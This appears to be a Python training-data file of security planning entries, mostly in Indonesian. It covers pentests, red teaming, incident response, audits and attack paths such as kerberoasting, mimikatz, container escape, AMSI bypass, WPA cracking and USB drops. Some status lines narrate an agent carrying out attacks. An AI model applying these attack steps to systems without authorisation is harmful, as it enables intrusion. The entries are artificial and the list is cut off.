"""PART3: PLANNING_DATA (80 entries) + WORKFLOW_DATA (80 entries)"""
from ds_part1 import _e

PLANNING_DATA = [
    _e("rancang pentest plan 5 hari untuk web application e-commerce",
       ["hari 1-2: recon dan information gathering","hari 3: active scanning dan vulnerability assessment",
        "hari 4: exploitation dan proof of concept","hari 5: cleanup dan report writing"],
       ["H1: subfinder + amass → subdomain mapping","H1: shodan → external exposure",
        "H2: httpx + nuclei → service fingerprint","H2: manual browsing → business logic",
        "H3: nikto + gobuster → web vuln scan","H3: sqlmap pada semua forms",
        "H4: manual exploit untuk confirmed findings","H4: privilege escalation attempt",
        "H5: cleanup, dokumentasi evidence, report draft"],
       ["scoping","passive_recon","active_scan","exploitation","report"],
       [("subfinder","subdomain discovery"),("nuclei","vulnerability scanning"),
        ("sqlmap","SQL injection testing"),("nikto","web scanner")],
       "5 hari sangat tight — prioritaskan high-value targets",
       "e-commerce scope: 3 domains, 1 API endpoint, 2 mobile apps",
       "senior penetration tester",
       "Pentest plan 5 hari dibuat. Memulai H1: passive recon."),

    _e("incident response plan untuk ransomware yang ditemukan di jaringan",
       ["containment dulu sebelum eradication — isolasi mesin terinfeksi",
        "preserve evidence sebelum cleanup — memory dump + disk image",
        "identify patient zero dan timeline infeksi",
        "eradication: remove malware, patch vulnerability yang digunakan"],
       ["1. Isolasi: putus network connection mesin terinfeksi",
        "2. Preserve: memory dump + disk image","3. Identify: malware hash → VirusTotal",
        "4. Timeline: chainsaw/volatility untuk reconstruct attack",
        "5. Blast radius: scan network untuk lateral spread",
        "6. Eradication: reimage mesin terinfeksi",
        "7. Recovery: restore dari backup verified clean",
        "8. Monitoring: EDR rules untuk re-infection detection"],
       ["contain","preserve","identify","scope","eradicate","recover","monitor","report"],
       [("volatility","memory forensics"),("chainsaw","Windows event log analysis"),
        ("yara","malware detection")],
       "jangan langsung reimage — evidence preservation kritis untuk legal",
       "ransomware: LockBit 3.0, 5 mesin terinfeksi, backup masih clean",
       "incident responder",
       "Ransomware IR dimulai. Step 1: containment — isolasi 5 mesin dari network."),

    _e("cloud security assessment plan untuk AWS production environment",
       ["assessment harus dilakukan di non-business hours","butuh temporary ReadOnly IAM role",
        "urutan: identity → network → storage → monitoring → applications",
        "critical findings butuh immediate escalation"],
       ["Phase 1 - Identity: prowler iam checks, IAM Access Analyzer",
        "Phase 2 - Network: security group review, VPC flow logs",
        "Phase 3 - Storage: S3 public access check, encryption at rest",
        "Phase 4 - Monitoring: CloudTrail, GuardDuty status",
        "Phase 5 - Compute: EC2 patch compliance, IMDSv2",
        "Phase 6 - Apps: Lambda exposed, API GW auth review"],
       ["iam_audit","network_audit","storage_audit","monitoring_audit","compute_audit","report"],
       [("prowler","AWS CIS benchmark audit"),("pacu","AWS exploitation testing"),
        ("trufflehog","secret scanning")],
       "remediation priority: public S3 > open SGs > IAM escalation paths",
       "AWS prod — 200+ checks, 15 critical, 42 high findings",
       "cloud security architect",
       "AWS assessment plan ready. Starting Phase 1: IAM audit dengan prowler."),

    _e("rancang automated daily security scan workflow untuk web production",
       ["scan harian butuh low-impact, tidak mengganggu production",
        "passive scan dulu: certificate check, header analysis, DNS monitoring",
        "active scan dengan throttling: rate limit 10 req/s",
        "integrasi dengan SIEM/Slack untuk alert distribution"],
       ["06:00 - certificate expiry check","06:30 - DNS change monitoring",
        "07:00 - nuclei scan low-rate templates","07:30 - HTTP header security check",
        "08:00 - report generation dan alert dispatch",
        "Alert: HIGH+ → immediate Slack","Alert: MEDIUM → weekly digest"],
       ["cert_check","dns_monitor","vuln_scan","header_check","alert","report"],
       [("nuclei","template-based vuln scan"),("dnsx","DNS monitoring"),
        ("openssl","certificate validation")],
       "rate limiting kritis untuk production scan — test di staging dulu",
       "automated scan: daily 45 menit runtime, 0 production impact",
       "DevSecOps engineer",
       "Daily scan workflow designed. Scheduling via cron: 0 6 * * *"),

    _e("rancang red team operation plan selama 2 minggu",
       ["2 minggu = full lifecycle: recon → initial access → persist → lateral → objectives",
        "rules of engagement harus clear: scope, no-go zones, abort conditions",
        "daily brief ke purple team untuk improve detection coverage"],
       ["W1D1-2: External recon + OSINT","W1D3-4: Initial access attempts",
        "W1D5: Foothold establishment, persistence","W2D1-2: Internal recon (bloodhound)",
        "W2D3: Lateral movement → domain admin","W2D4: Objectives completion",
        "W2D5: Debrief, cleanup, report"],
       ["recon","initial_access","persist","internal_recon","lateral_move","objectives","cleanup"],
       [("subfinder","external recon"),("gophish","phishing simulation"),
        ("bloodhound","AD mapping"),("crackmapexec","lateral movement")],
       "purple team integration meningkatkan nilai red team exercise",
       "2-week red team: domain admin D10, 3GB data exfil simulation",
       "red team lead",
       "Red team plan finalized. W1D1: external OSINT gathering."),

    _e("design threat hunting workflow untuk APT indicators di enterprise",
       ["threat hunting = proactively search for threats yang belum dideteksi",
        "mulai dari hypothesis based on MITRE ATT&CK TTPs",
        "sistematik: hypothesis → data collection → analysis → finding → improve detection"],
       ["H1: Hypothesis — lateral movement via WMI (T1047)",
        "Data: Windows event 4688, Sysmon 3, network conn logs",
        "H2: Hypothesis — credential dumping via LSASS (T1003.001)",
        "H3: Hypothesis — persistence via scheduled task (T1053.005)",
        "Untuk setiap hypothesis: query SIEM, analyze anomalies, escalate jika found"],
       ["hypothesis_build","data_source_id","siem_query","anomaly_detect","detection_improve"],
       [("chainsaw","Windows event log hunting"),("sigma","detection rule framework"),
        ("zeek","network traffic analysis")],
       "document setiap hunting session untuk build institutional knowledge",
       "3 APT indicators ditemukan: WMI lateral movement, LSASS access, scheduled task",
       "threat hunter",
       "Threat hunting dimulai. H1: WMI lateral movement query ke SIEM."),

    _e("design security assessment untuk mobile app Android",
       ["Android assessment = static + dynamic + network analysis",
        "static: decompile APK, analisa permissions, hardcoded secrets",
        "dynamic: frida untuk runtime hooking, SSL pinning bypass",
        "network: intercept traffic via proxy (Burp Suite)"],
       ["Static: apktool d app.apk, jadx-gui app.apk",
        "Check: AndroidManifest.xml permissions, exported components",
        "Check: strings/grep untuk hardcoded keys, URLs, credentials",
        "Dynamic: adb connect device, frida-server install",
        "SSL bypass: frida -U -l ssl-pinning-bypass.js -f com.app.name",
        "Network: Burp Suite proxy, intercept + test API endpoints"],
       ["apk_decompile","manifest_review","static_secret_hunt","dynamic_setup","ssl_bypass","api_test"],
       [("apktool","APK decompilation"),("jadx","Java decompiler"),
        ("frida","dynamic instrumentation"),("burpsuite","HTTP proxy")],
       "SSL pinning bypass harus dilakukan sebelum network testing",
       "app.apk — hardcoded API key, 3 exported activities, 2 insecure deeplinks",
       "mobile security tester",
       "Android assessment: apktool d app.apk → checking AndroidManifest.xml"),

    _e("rancang API security assessment plan untuk REST API",
       ["API assessment = endpoint discovery, auth testing, injection, business logic",
        "dokumentasi API: swagger/OpenAPI spec sebagai starting point",
        "testing priority: authentication, authorization, input validation, rate limiting"],
       ["Phase 1: Endpoint discovery dengan ffuf + swagger parsing",
        "Phase 2: Authentication testing — JWT, OAuth, API key weakness",
        "Phase 3: Authorization — IDOR, horizontal/vertical privilege",
        "Phase 4: Injection — SQLi, NoSQLi, SSTI, XXE via API",
        "Phase 5: Business logic — race condition, mass assignment",
        "Phase 6: Rate limiting, DoS vectors"],
       ["endpoint_discover","auth_test","authz_test","injection_test","logic_test","rate_check"],
       [("ffuf","API endpoint fuzzing"),("burpsuite","HTTP proxy dan testing"),
        ("postman","API request crafting")],
       "swagger spec menghemat 50% endpoint discovery time — get spec dari /api/docs dulu",
       "REST API — 45 endpoints, 8 auth issues, 3 IDOR, 2 injection points",
       "API security assessor",
       "API pentest plan ready. Phase 1: endpoint discovery dari /api/docs swagger spec."),

    _e("design Kubernetes security audit plan",
       ["K8s audit = cluster config, RBAC, network policy, image security, secrets",
        "butuh cluster-admin atau viewer access",
        "kube-bench untuk CIS benchmark compliance check",
        "fokus: API server access, etcd exposure, RBAC over-permission"],
       ["Phase 1: API server access — anonymous auth, RBAC audit",
        "Phase 2: Node security — kubelet API exposed, host path mounts",
        "Phase 3: Workload — privileged pods, hostNetwork, hostPID",
        "Phase 4: Network — network policies, ingress exposure",
        "Phase 5: Secrets — encrypted at rest, external secrets manager",
        "Phase 6: Images — image scanning, admission webhook"],
       ["api_audit","node_audit","workload_audit","network_audit","secret_audit","image_audit"],
       [("kube-bench","K8s CIS benchmark"),("kube-hunter","K8s vulnerability scanner"),
        ("trivy","container image scanner")],
       "kube-bench compliance report adalah excellent baseline untuk remediation tracking",
       "K8s cluster: 45 CIS failures, 3 anonymous auth endpoints, 12 privileged pods",
       "Kubernetes security auditor",
       "K8s audit: kube-bench → 45 failures. Phase 1: API server security review."),

    _e("vulnerability management program plan untuk enterprise 500 servers",
       ["VM program = continuous identify → assess → prioritize → remediate → verify",
        "tooling: Nessus/Qualys untuk discovery, Jira untuk tracking, dashboard untuk visibility",
        "SLA: critical patch 24h, high 7 days, medium 30 days, low 90 days"],
       ["Week 1: Deploy scanner, baseline scan semua 500 servers",
        "Week 2: Triage results, create Jira tickets per finding",
        "Week 3: Remediation sprint 1 — critical findings",
        "Week 4: Verify remediation, rescan patched systems",
        "Monthly: recurring scan, metrics report ke management",
        "Quarterly: program review, SLA compliance metrics"],
       ["scanner_deploy","baseline_scan","finding_triage","ticket_create","remediation","verify","report"],
       [("nessus","enterprise vulnerability scanner"),("jira","vulnerability tracking"),
        ("splunk","vulnerability metrics dashboard")],
       "VM program value = reduction in mean time to remediate (MTTR) over time",
       "500 servers baseline: 1250 critical, 3400 high, progress tracked ke <100 critical in 30d",
       "vulnerability management program manager",
       "VM program launched. Baseline scan: 500 servers, 1250 critical findings. SLA: patch 24h."),

    _e("plan Active Directory security hardening project",
       ["AD hardening = reduce attack surface untuk privilege escalation dan lateral movement",
        "focus: tiered admin model, LAPS, credential protection, legacy protocol disable",
        "baseline current dengan BloodHound sebelum hardening untuk measure improvement"],
       ["Week 1: BloodHound assessment — map current attack paths",
        "Week 2: Tiered admin model implementation (Tier 0/1/2)",
        "Week 3: LAPS deployment untuk local admin password management",
        "Week 4: Disable legacy protocols: NTLM v1, LM hashing",
        "Week 5: Credential protection: Credential Guard, Protected Users group",
        "Week 6: Monitoring: AD audit logging, honeypot accounts",
        "Week 7: Re-run BloodHound — measure attack path reduction"],
       ["baseline_assess","tiered_admin","laps_deploy","legacy_disable","cred_protect","monitor","reassess"],
       [("bloodhound","AD attack path mapping"),("LAPS","local admin password solution"),
        ("pingcastle","AD security scoring")],
       "tiered admin model adalah single most impactful AD hardening measure",
       "AD baseline: 47 DA paths. After hardening: 3 paths, LAPS deployed, NTLM v1 disabled",
       "Active Directory security architect",
       "AD hardening project launched. Baseline BloodHound: 47 paths to Domain Admin."),

    _e("plan IoT firmware security assessment",
       ["IoT assessment = firmware static + dynamic + hardware + network analysis",
        "firmware extraction: binwalk, atau physical UART/JTAG",
        "emulation: QEMU atau Firmadyne untuk dynamic testing tanpa hardware"],
       ["Phase 1: Firmware acquisition — download dari vendor atau extract via UART",
        "Phase 2: Static analysis — binwalk extract, firmwalker scan",
        "Phase 3: Filesystem analysis — find hardcoded creds, keys, backdoors",
        "Phase 4: Binary analysis — ghidra untuk critical services",
        "Phase 5: Network services — nmap scan dalam emulated environment",
        "Phase 6: Dynamic analysis — QEMU emulation, Frida hooks"],
       ["firmware_acquire","static_analysis","filesystem_hunt","binary_reverse","network_scan","dynamic_test"],
       [("binwalk","firmware extraction"),("firmwalker","filesystem security scan"),
        ("ghidra","binary reverse engineering"),("qemu","firmware emulation")],
       "UART access memberikan root shell langsung — check dulu sebelum firmware download",
       "IoT router: hardcoded admin:admin12345, telnet backdoor, 3 buffer overflows via Ghidra",
       "IoT security researcher",
       "IoT assessment plan: firmware acquired via UART. binwalk extracting filesystem..."),

    _e("plan forensics investigation untuk suspected insider threat",
       ["insider threat forensics = lebih sensitif karena melibatkan employee",
        "legal: pastikan HR dan Legal sudah approve sebelum investigation dimulai",
        "chain of custody: semua evidence harus documented properly",
        "focus: data exfiltration patterns, policy violations, timeline"],
       ["Phase 1: Legal authorization — HR, Legal, CISO sign-off",
        "Phase 2: Evidence preservation — image workstation, backup cloud data",
        "Phase 3: DLP analysis — what data was accessed dan transferred",
        "Phase 4: Email analysis — external forwarding, large attachment",
        "Phase 5: Network analysis — unusual external connections",
        "Phase 6: Timeline reconstruction — sequence of events",
        "Phase 7: Report → HR + Legal untuk action"],
       ["authorization","evidence_preserve","dlp_analysis","email_forensics","network_forensics","timeline","report"],
       [("autopsy","disk forensics"),("plaso","timeline creation"),
        ("bulk_extractor","email dan URL extraction")],
       "do NOT confront suspect sebelum investigation complete — alert behavior change",
       "insider threat — 2.3GB data exfil via personal Dropbox over 2 weeks",
       "forensics investigator",
       "Insider threat investigation authorized. Phase 2: evidence preservation dimulai."),

    _e("design wireless security assessment plan untuk office building",
       ["wireless assessment = discover, enumerate, test security pada semua WiFi networks",
        "scope: company SSIDs + rogue AP detection",
        "indoor survey: setiap floor, setiap meeting room"],
       ["Phase 1: Passive survey — airodump semua channels",
        "Phase 2: Active enumeration — WPS check, encryption type",
        "Phase 3: Rogue AP detection — compare authorized SSID list",
        "Phase 4: WPA2 attack — capture handshake, offline crack attempt",
        "Phase 5: WPA Enterprise test — EAP type, certificate validation",
        "Phase 6: MITM test — authorized network MITM via bettercap",
        "Phase 7: Client isolation check — can clients talk to each other?"],
       ["passive_survey","ap_enum","rogue_detect","wpa_attack","wpa_enterprise","mitm_test","isolation_check"],
       [("kismet","passive wireless monitor"),("airodump-ng","active survey"),
        ("bettercap","wireless MITM"),("eaphammer","WPA enterprise attack")],
       "survey pada peak hours: lebih banyak client = lebih banyak data untuk analysis",
       "office wireless: 1 rogue AP found, WPA2 PSK cracked (weak password), no client isolation",
       "wireless security assessor",
       "Wireless assessment dimulai. Passive survey: kismet → 23 APs found, 1 unauthorized."),

    _e("rancang supply chain security assessment untuk software vendor",
       ["supply chain attack = compromise software delivery untuk reach downstream customers",
        "scope: build process, dependencies, signing, distribution",
        "SLSA framework untuk supply chain security levels"],
       ["Phase 1: Source code management — branch protection, signing, 2FA",
        "Phase 2: Dependencies — SCA scan (snyk, dependabot), outdated packages",
        "Phase 3: Build pipeline — CI/CD security, secret management",
        "Phase 4: Artifact signing — sigstore/cosign, SBOM generation",
        "Phase 5: Distribution — registry security, release signing",
        "Phase 6: Monitoring — dependency confusion attack test"],
       ["scm_audit","sca_scan","cicd_security","artifact_signing","distribution_security","monitor"],
       [("snyk","software composition analysis"),("syft","SBOM generation"),
        ("cosign","artifact signing"),("gitleaks","secret scanning in CI")],
       "dependency confusion attack test: publish package ke public registry dengan company namespace",
       "vendor assessment: 45 outdated deps, 3 critical CVEs, no artifact signing, secrets in CI",
       "supply chain security analyst",
       "Supply chain assessment: SCA scan → 3 critical CVEs in dependencies. No signing configured."),

    _e("plan DevSecOps security integration untuk CI/CD pipeline",
       ["DevSecOps = shift security left, bukan security sebagai bottleneck",
        "integrate: SAST, DAST, SCA, secret scanning di setiap PR",
        "fail fast: critical security issue = PR blocked, tidak boleh merge"],
       ["Stage 1: Pre-commit hooks — gitleaks secret scan, semgrep SAST",
        "Stage 2: CI pipeline — SAST full scan (bandit/sonarqube), SCA (snyk)",
        "Stage 3: Container — trivy image scan, dockerfile lint",
        "Stage 4: DAST — OWASP ZAP scan against staging environment",
        "Stage 5: Pre-prod — pentest summary review, threat model update",
        "Stage 6: Production — runtime security (Falco), continuous scanning"],
       ["pre_commit","ci_sast","container_scan","dast","pre_prod_review","runtime"],
       [("semgrep","SAST linting"),("trivy","container scanning"),
        ("zap","DAST automation"),("falco","runtime security")],
       "false positive dari SAST harus di-tuning — terlalu banyak FP = developers ignore alerts",
       "DevSecOps pipeline: 85% coverage, <15 min feedback loop, 3 critical findings blocked in 30d",
       "DevSecOps engineer",
       "DevSecOps pipeline integrated. Pre-commit hooks + CI SAST + container scan deployed."),

    _e("plan physical penetration test untuk kantor target",
       ["physical pentest = test physical access controls, social engineering on-site",
        "scope: reception bypass, server room access, dumpster diving",
        "authorization letter WAJIB dibawa — bisa ditangkap tanpa ini"],
       ["Phase 1: OSINT — building layout, badge system, visitor policy",
        "Phase 2: Pretext creation — fake delivery, fake IT, fake vendor",
        "Phase 3: Tailgating attempt di main entrance",
        "Phase 4: Reception social engineering — visitor badge obtainment",
        "Phase 5: Internal building access — server room, printer room",
        "Phase 6: USB drop — labeled HID device di parking lot",
        "Phase 7: Dumpster diving — shredding policy assessment"],
       ["osint_building","pretext_create","tailgate","reception_social","internal_access","usb_drop","dumpster"],
       [("USB rubber ducky","HID attack device"),("lockpick set","physical lock bypass")],
       "authorization letter in writing, signed oleh CEO/CISO — carry at all times",
       "physical pentest: reception bypassed, server room accessed, 3 USB drop found plugged",
       "physical security assessor",
       "Physical pentest: OSINT complete. Day 1: tailgating dan reception social engineering."),

    _e("design security code review plan untuk high-risk application",
       ["code review = manual + automated analysis source code untuk security bugs",
        "focus areas: authentication, authorization, input validation, crypto, error handling",
        "threat model driven — review berdasarkan STRIDE untuk target code areas"],
       ["Phase 1: Threat model review — understand attack surface",
        "Phase 2: Automated SAST — semgrep, bandit, sonarqube untuk quick wins",
        "Phase 3: Manual review — auth logic, crypto implementation, session mgmt",
        "Phase 4: Dependency review — known CVE dalam third-party libraries",
        "Phase 5: Configuration review — hardcoded secrets, debug mode",
        "Phase 6: Finding triage — FP removal, CVSS scoring",
        "Phase 7: Developer walkthrough — explain findings + remediation"],
       ["threat_model","automated_sast","manual_review","dep_review","config_review","triage","walkthrough"],
       [("semgrep","SAST rule engine"),("bandit","Python security linter"),
        ("sonarqube","code quality and security")],
       "manual review 3-5x lebih effective dari automated SAST untuk logic bugs",
       "banking app review: 12 critical (SQL injection, hardcoded key, insecure crypto)",
       "secure code reviewer",
       "Code review plan. Phase 1: threat model. Phase 2: semgrep SAST scan running..."),

    _e("plan DDoS resilience assessment untuk web platform",
       ["DDoS assessment = test kemampuan platform untuk withstand volumetric dan application attacks",
        "bedakan: volumetric DDoS vs application layer (L7) DoS",
        "testing harus koordinasi dengan NOC dan CDN provider",
        "scope: rate limits, connection limits, resource exhaustion"],
       ["Phase 1: Baseline capacity testing — normal load measurement",
        "Phase 2: Rate limit testing — HTTP request flood (authorized)",
        "Phase 3: Slow HTTP attacks — slowloris, slow POST",
        "Phase 4: Application DoS — expensive endpoint (search, report generation)",
        "Phase 5: DNS resilience — DNS query flood (authorized)",
        "Phase 6: CDN failover test — behavior saat origin overwhelmed"],
       ["baseline","rate_limit_test","slow_attack","app_dos","dns_test","cdn_failover"],
       [("hping3","packet flood testing"),("slowhttptest","slow HTTP attacks"),
        ("vegeta","HTTP load testing")],
       "DDoS assessment perlu window waktu khusus — koordinasi NOC untuk monitor impact",
       "platform — rate limit 100 req/s confirmed, CDN absorb 10Gbps, slowloris unprotected",
       "resilience testing engineer",
       "DDoS assessment plan. Phase 1: baseline load test. Coordinating dengan NOC."),

    _e("rancang bug bounty hunting methodology untuk program VDP",
       ["bug bounty = authorized vulnerability research dengan reward",
        "methodology: recon → surface mapping → deep testing per area",
        "prioritize: high-impact, out-of-scope-awareness, unique findings"],
       ["Phase 1: Scope review — in-scope domains, excluded systems, reward tiers",
        "Phase 2: Recon — subfinder + amass + shodan untuk scope mapping",
        "Phase 3: Surface mapping — endpoint discovery, tech fingerprint",
        "Phase 4: Quick wins — nuclei scan untuk known CVEs",
        "Phase 5: Deep testing — manual testing per OWASP top 10",
        "Phase 6: Business logic — manual testing of core functionality",
        "Phase 7: Report writing — clear PoC, CVSS score, remediation suggestion"],
       ["scope_review","recon","surface_map","quick_scan","deep_test","logic_test","report"],
       [("subfinder","recon"),("nuclei","quick CVE scan"),("burpsuite","manual testing")],
       "duplicates = no reward — check hackerone/bugcrowd dulu untuk known findings",
       "bug bounty: 3 findings submitted, 1 critical (SSRF → RCE), $5000 reward",
       "bug bounty hunter",
       "Bug bounty methodology: scope review → recon → nuclei scan → deep manual testing."),

    _e("plan Active Directory red team dengan bloodhound pathfinding",
       ["AD red team = simulate real APT attacking Active Directory dari initial foothold",
        "bloodhound sebagai guide untuk attack path planning",
        "phased approach: foothold → local admin → domain admin"],
       ["Phase 1: Initial foothold — phishing atau web app exploit",
        "Phase 2: Local enumeration — winpeas, network discovery",
        "Phase 3: BloodHound collection — map AD relationships",
        "Phase 4: Attack path execution — follow shortest path ke DA",
        "Phase 5: Credential harvesting — kerberoasting, mimikatz",
        "Phase 6: Domain admin abuse — DCSync, persistence",
        "Phase 7: Objective completion — data access, exfil simulation"],
       ["foothold","local_enum","ad_map","path_execute","cred_harvest","da_achieve","objective"],
       [("bloodhound","AD attack path analysis"),("impacket","Windows protocol exploitation"),
        ("mimikatz","credential extraction"),("crackmapexec","lateral movement")],
       "BloodHound attack paths prioritize: shortest path dengan lowest detection risk",
       "AD red team: initial foothold via web, DA via kerberoasting + bloodhound path in 3 days",
       "AD red team lead",
       "AD red team: BloodHound loaded, 5 paths to DA. Executing shortest path via kerberoasting."),

    _e("design container escape dan kubernetes attack chain",
       ["container escape = break dari container isolation ke host",
        "privileged container = near-immediate escape",
        "escape vectors: privileged mode, hostPath, docker socket, capability abuse"],
       ["Phase 1: Container inventory — identify privileged, hostPID, hostNetwork",
        "Phase 2: Docker socket check — /var/run/docker.sock mounted?",
        "Phase 3: Capability audit — cap_sys_admin, cap_net_admin",
        "Phase 4: hostPath mounts — write ke host filesystem?",
        "Phase 5: Service account token abuse — rbac privilege escalation",
        "Phase 6: Lateral movement dalam cluster — service discovery"],
       ["container_audit","socket_check","cap_check","mount_check","sa_abuse","cluster_lateral"],
       [("deepce","container escape tool"),("kube-hunter","K8s security scanner"),
        ("peirates","Kubernetes penetration testing")],
       "docker socket mount = immediate host escape — highest priority check",
       "K8s cluster: docker socket mounted in 2 pods, cap_sys_admin in 5, host escape confirmed",
       "container security analyst",
       "Container escape audit: docker socket check → /var/run/docker.sock mounted! Escaping..."),

    _e("plan penetration test untuk SCADA/ICS environment",
       ["ICS/SCADA pentest = SANGAT berbahaya, bisa cause physical damage",
        "passive only assessment sangat dianjurkan untuk production",
        "coordination dengan OT team mandatory sebelum setiap langkah",
        "scope: ONLY authorized test systems, never production PLC"],
       ["Phase 1: Passive network capture — traffic analysis only",
        "Phase 2: Network topology mapping — passive discovery",
        "Phase 3: Protocol analysis — Modbus, DNP3, IEC 61850",
        "Phase 4: HMI web interface audit — web-based control panel",
        "Phase 5: Remote access review — VPN, RDP ke ICS jump host",
        "Phase 6: Passive vulnerability identification — no exploitation"],
       ["passive_capture","topology_map","protocol_analysis","hmi_audit","remote_access","vuln_id"],
       [("wireshark","ICS protocol analysis"),("nmap","passive network mapping"),
        ("plcscan","PLC security scanner")],
       "NEVER exploit PLC atau RTU dalam production — physical consequences sangat serius",
       "ICS assessment (passive): Modbus no auth, HMI default creds, VPN outdated — critical risks",
       "ICS security assessor",
       "ICS assessment plan. Passive only. Phase 1: network capture untuk protocol analysis."),

    _e("rancang phishing simulation dan security awareness training program",
       ["phishing sim = measure + train, bukan punish",
        "3-phase: baseline → training → retest untuk measure improvement",
        "customize scenario berdasarkan industry dan role"],
       ["Month 1: Baseline phishing campaign (no warning) — measure click rate",
        "Month 2: Security awareness training rollout (all employees)",
        "Month 3: Post-training phishing test — measure improvement",
        "Quarterly: Targeted spear phishing untuk high-risk roles",
        "Annual: Comprehensive awareness program review",
        "Metrics: click rate, report rate, credential submission rate"],
       ["baseline_sim","training_rollout","retest","spear_phishing","metrics","program_review"],
       [("gophish","phishing platform"),("knowbe4","security awareness platform")],
       "blame-free culture penting — tujuan adalah education, bukan punishment",
       "program results: click rate 35% → 8% setelah training, report rate 0% → 45%",
       "security awareness program manager",
       "Phishing program: baseline 35% click rate. Training deployed. Retesting Month 3."),

    _e("design blockchain/smart contract security audit plan",
       ["smart contract audit = review Solidity/EVM code untuk security vulnerabilities",
        "common bugs: reentrancy, integer overflow, access control, front-running",
        "tools: slither, mythril untuk automated, manual review untuk logic"],
       ["Phase 1: Code review — manual Solidity review dengan checklist",
        "Phase 2: Automated analysis — slither, mythril, echidna fuzzer",
        "Phase 3: Business logic — economic attack modeling",
        "Phase 4: Integration review — external contract calls, oracle usage",
        "Phase 5: Gas optimization — DoS via gas exhaustion",
        "Phase 6: Test suite review — coverage dan edge cases"],
       ["manual_review","automated_scan","logic_model","integration_check","gas_review","test_review"],
       [("slither","Solidity static analyzer"),("mythril","EVM symbolic execution"),
        ("echidna","Solidity fuzzer")],
       "reentrancy adalah vuln paling costly dalam DeFi history — always check dulu",
       "DeFi contract: reentrancy in withdraw(), unchecked math, oracle manipulation risk",
       "smart contract auditor",
       "Smart contract audit: slither scan → reentrancy detected! Manual review confirming..."),

    _e("plan security audit untuk microservices architecture",
       ["microservices = banyak services kecil, attack surface tersebar",
        "service-to-service auth sering lemah: no mTLS, shared secrets",
        "API gateway sebagai entry point utama yang perlu diaudit"],
       ["Phase 1: Architecture review — service map, trust boundaries",
        "Phase 2: API gateway audit — auth, rate limit, WAF rules",
        "Phase 3: Service-to-service auth — mTLS, JWT, API key management",
        "Phase 4: Individual service testing — input validation, business logic",
        "Phase 5: Service mesh security — Istio/Linkerd configuration",
        "Phase 6: Container dan orchestration security",
        "Phase 7: Secrets management — vault, K8s secrets"],
       ["arch_review","gateway_audit","service_auth","service_test","mesh_security","container_check","secret_mgmt"],
       [("burpsuite","API gateway testing"),("kube-bench","K8s security"),
        ("trivy","container scanning")],
       "service mesh mTLS adalah single most impactful security control untuk microservices",
       "microservices: no mTLS between services, API gateway bypass via direct service URL",
       "microservices security architect",
       "Microservices audit: architecture review → 12 services without mTLS! Testing API gateway bypass."),

    _e("plan ransomware simulation untuk business continuity testing",
       ["ransomware simulation = test kesiapan backup, response, dan recovery",
        "TIDAK menggunakan real ransomware — simulasi file encryption patterns",
        "coordinate dengan IT, backup team, dan management sebelum test"],
       ["Phase 1: Backup inventory — identify all backup systems dan retention",
        "Phase 2: Recovery time objective (RTO) baseline measurement",
        "Phase 3: Simulation — encrypt test file set in isolated environment",
        "Phase 4: Recovery test — restore dari backup, measure time",
        "Phase 5: Communication test — incident notification workflow",
        "Phase 6: Gap analysis — what failed, RTO vs actual recovery time"],
       ["backup_audit","rto_baseline","simulation_run","recovery_test","comms_test","gap_analysis"],
       [("python","custom ransomware simulation script"),("veeam","backup and recovery platform")],
       "backup yang tidak pernah ditest = backup yang tidak bisa dipercaya",
       "BC test: RTO target 4h, actual recovery 11h, backup dari 3 days ago (not 24h), gaps identified",
       "business continuity assessor",
       "Ransomware BC test: backup inventory → recovery test → 11h actual vs 4h target. Gap!"),

    _e("design endpoint detection dan response (EDR) evaluation plan",
       ["EDR evaluation = test kemampuan deteksi dan response terhadap real attack techniques",
        "gunakan MITRE ATT&CK framework sebagai test matrix",
        "test vendor claims dengan actual red team techniques"],
       ["Phase 1: Lab setup — isolated test environment dengan EDR agent",
        "Phase 2: Basic technique test — process injection, credential dump",
        "Phase 3: Evasion technique test — AMSI bypass, direct syscall",
        "Phase 4: Lateral movement detection — PtH, PtT, lateral tools",
        "Phase 5: Persistence detection — registry, scheduled task, service",
        "Phase 6: Exfiltration detection — DNS tunnel, HTTPS C2",
        "Phase 7: Response test — alert quality, SOC response time"],
       ["lab_setup","basic_technique","evasion_test","lateral_detect","persist_detect","exfil_detect","response"],
       [("atomic red team","MITRE technique testing"),("caldera","automated adversary simulation")],
       "test EDR dengan real-world evasion techniques yang APT gunakan — tidak hanya PoC",
       "EDR eval: 75% MITRE technique detected, 3 evasion bypass successful, 8min mean response",
       "EDR evaluation specialist",
       "EDR eval: atomic-red-team testing 60 techniques. CrowdStrike: 45/60 detected, 8min response."),

    _e("plan zero-trust network implementation security assessment",
       ["zero-trust = never trust, always verify — no implicit trust dari network location",
        "assess: identity, device, network, application, data layers",
        "benchmark terhadap NIST SP 800-207 atau Gartner zero-trust framework"],
       ["Phase 1: Identity — MFA coverage, privileged access management",
        "Phase 2: Device — endpoint compliance, certificate-based auth",
        "Phase 3: Network — micro-segmentation, east-west traffic control",
        "Phase 4: Application — app-level auth, mTLS, RBAC",
        "Phase 5: Data — classification, DLP, encryption at rest dan in transit",
        "Phase 6: Visibility — logging, SIEM coverage, anomaly detection"],
       ["identity_assess","device_assess","network_segment","app_auth","data_protection","visibility"],
       [("beyond corp","zero-trust reference implementation"),("zscaler","zero-trust network access")],
       "zero-trust adalah journey, bukan binary state — measure maturity level incrementally",
       "ZT assessment: MFA 45% coverage, no micro-segmentation, east-west uncontrolled",
       "zero-trust architect",
       "ZT assessment: MFA 45% → target 95%. Micro-segmentation: not implemented. Roadmap created."),

    _e("plan malware reverse engineering campaign untuk threat intel",
       ["malware RE untuk threat intel = extract IOCs, TTPs, attribution indicators",
        "static + dynamic analysis pipeline untuk multiple samples",
        "output: threat intel report dengan MITRE ATT&CK mapping"],
       ["Phase 1: Triage — hash lookup VirusTotal, family identification",
        "Phase 2: Static analysis — strings, floss, imports, PE headers",
        "Phase 3: Dynamic analysis — sandbox (Cape/ANY.RUN), behavior capture",
        "Phase 4: Deep reverse — ghidra untuk obfuscated/custom code",
        "Phase 5: IOC extraction — IPs, domains, mutex, registry keys",
        "Phase 6: TTP mapping — MITRE ATT&CK techniques",
        "Phase 7: Threat intel report + detection rule creation"],
       ["triage","static_analysis","dynamic_analysis","deep_reverse","ioc_extract","ttp_map","report"],
       [("capev2","dynamic sandbox"),("ghidra","static reverse engineering"),
        ("yarGen","YARA rule generation")],
       "document TTPs, bukan hanya IOCs — IOCs expire, TTPs persist",
       "malware campaign: 12 samples analyzed, Lazarus Group attribution, 45 IOCs, 23 TTPs",
       "malware threat intelligence analyst",
       "Malware RE campaign: 12 samples. Phase 1: VT lookup → 10/12 known, 2 new. Analyzing..."),

